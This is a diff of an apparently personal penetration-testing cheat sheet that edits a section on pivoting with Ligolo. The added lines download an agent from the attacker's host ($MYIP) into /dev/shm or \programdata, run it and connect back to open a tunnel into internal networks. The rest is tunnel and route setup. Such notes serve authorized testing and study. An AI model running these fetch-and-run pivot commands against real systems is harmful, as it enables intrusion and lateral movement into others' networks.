@@ -1437,10 +1437,9 @@ scp -C -r /Upload user@proxybox:/ ; ssh user@proxybox; python3 -m http.server 13
 ## Ligolo - Port Forward and Pivot
 -->> New Configuration
 sudo ligolo-proxy -selfcert -laddr 0.0.0.0:8080
-curl $MYIP/linux/agent -o agent
-chmod +x agent;
-./agent -ignore-cert -connect $MYIP:8080
-session
+curl $MYIP/linux/agent -o /dev/shm/agent; chmod +x /dev/shm/agent; /dev/shm/agent -ignore-cert -connect $MYIP:8080
+curl $MYIP/windows/agent.exe -o \programdata\agent; \programdata\agent -ignore-cert -connect $MYIP:8080
+session 1
 interface_create --name ligolo
 tunnel_start --tun ligolo
 ifconfig
@@ -1448,18 +1447,7 @@ interface_add_route --name ligolo --route 240.0.0.1/32
 interface_add_route --name ligolo --route 192.168.110.51/24
 
 -->> Reset Configuration
-stop
-interface_delete --name ligolo
-start
-
--->> Change Session Pivot Point
-session_list
-session
-1
-stop
-session
-2
-start
+stop,  interface_delete --name ligolo,  start
 
 -->> Single Host: Attack Forwarded Host
 chromium 240.0.0.1:3000
